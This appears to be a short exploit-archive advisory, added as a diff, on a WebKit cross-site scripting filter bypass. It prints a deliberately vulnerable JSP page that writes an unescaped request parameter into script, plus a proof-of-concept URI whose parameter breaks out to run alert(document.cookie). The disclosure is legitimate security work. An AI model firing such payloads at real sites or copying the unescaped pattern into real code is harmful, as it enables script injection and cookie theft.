@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/56570/info
+
+WebKit is prone to a security-bypass vulnerability.
+
+An attacker can exploit this vulnerability to bypass the cross-site scripting filter mechanism. Successful exploits may allow attackers to execute arbitrary script code and steal cookie-based authentication credentials. 
+
+Code in test.jsp:
+
+<title>Test Page</title>
+<script>
+var foo = "<%= request.getParameter("foo") %>";
+document.write("<text>Welcome "+ foo + "</text>");
+</script>
+
+Example URI:
+
+http://www.domain.com/test.jsp?foo=2"; alert(document.cookie); var a="1 
